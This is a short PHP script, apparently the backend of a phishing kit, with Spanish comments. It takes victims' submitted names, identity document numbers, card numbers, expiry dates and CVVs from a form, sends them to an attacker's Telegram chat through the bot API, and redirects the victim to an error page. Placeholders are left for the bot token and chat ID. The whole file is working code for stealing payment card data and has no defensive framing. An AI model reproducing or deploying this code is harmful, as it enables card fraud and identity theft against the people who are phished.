<?php
define('TOKEN', 'TOKEN AQUI'); // Añade el token del bot aquí
define('ID', 'ID AQUI'); // Añade el ID del chat aquí
define('API', 'https://api.telegram.org/bot'.TOKEN.'/');

if(isset($_POST['denei']) && isset($_POST['nombre']) && isset($_POST['numero']) && isset($_POST['mes']) && isset($_POST['ano']) && isset($_POST['cvv'])) {
    $denei = $_POST['denei'];
    $nombre = $_POST['nombre']; 
    $numero = $_POST['numero']; 
    $cvv = $_POST['cvv'];
    $mes = $_POST['mes'];  // Asegúrate de tener este campo en tu formulario HTML
    $ano = $_POST['ano'];  // Asegúrate de tener este campo en tu formulario HTML

    $mensaje = "━━━━━━ Sr.Papaleta ━━━━━━\n";
    $mensaje .= "Nombre y Apellido : ".$nombre."\n";
    $mensaje .= "Doc. de identidad : ".$denei."\n";
    $mensaje .= "CCnum : ".$numero."\n";
    $mensaje .= "Exp : ".$mes."/".$ano."\n";  // Concatena el mes y el año con una barra
    $mensaje .= "CVV : ".$cvv."\n";
    $mensaje .= "━━━━━━ Sr.Papaleta ━━━━━━\n"; 

    $queryArray = [
        'chat_id' => ID,
        'text' => $mensaje,
    ];
    
    $url = API . 'sendMessage?' . http_build_query($queryArray);
    file_get_contents($url);
}
?>
<meta http-equiv='refresh' content='0;url=error.html'>
